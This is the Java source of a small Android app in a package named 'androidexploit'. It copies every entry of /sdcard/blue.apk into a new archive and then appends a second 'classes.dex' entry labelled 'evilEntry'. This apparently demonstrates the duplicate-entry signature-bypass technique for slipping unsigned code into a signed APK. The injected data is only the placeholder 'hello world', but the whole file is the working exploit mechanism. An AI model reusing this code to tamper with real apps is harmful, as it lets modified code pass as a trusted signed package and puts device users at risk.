package com.example.androidexploit;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Map.Entry;
import java.util.Set;
import java.util.zip.ZipEntry;

import kellinwood.zipio.ZioEntry;
import kellinwood.zipio.ZipInput;
import kellinwood.zipio.ZipOutput;
import android.app.Activity;
import android.os.Bundle;
import android.widget.ScrollView;
import android.widget.TextView;


public class Main extends Activity {
	
	static ScrollView sv;
	static TextView tv;
	
	public static void log(String s) {
		tv.setText(":" + s + "\n");
	}
	
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		sv = new ScrollView(this);
		tv = new TextView(this);
		sv.addView(tv);
		setContentView(sv);
		
		try {
			main();
		} catch(Exception e) {
			throw new RuntimeException(e);
		}
		
	}
	
	public void main() throws Exception {
		ZipInput origApk = new ZipInput("/sdcard/blue.apk");
		ZipOutput zipOut = new ZipOutput(new FileOutputStream("/sdcard/blue-mod.apk"));
		
		Set<Entry<String, ZioEntry>> entries = origApk.getEntries().entrySet();
		for(Entry<String, ZioEntry> entry : entries) {
			zipOut.write(entry.getValue());
			
			InputStream entryDataStream = entry.getValue().getInputStream();
			byte buffer[] = new byte[4048];
			
			while(entryDataStream.available() > 0) {
				int length = entryDataStream.read(buffer);
				zipOut.writeBytes(buffer, 0, length);
			}
		}
		
		ZioEntry evilEntry = new ZioEntry("classes.dex");
		zipOut.write(evilEntry);
		byte evilData[] = "hello world".getBytes();
		zipOut.writeBytes(evilData);
		
		zipOut.close();
		log("done");
		
	}
	
	

}
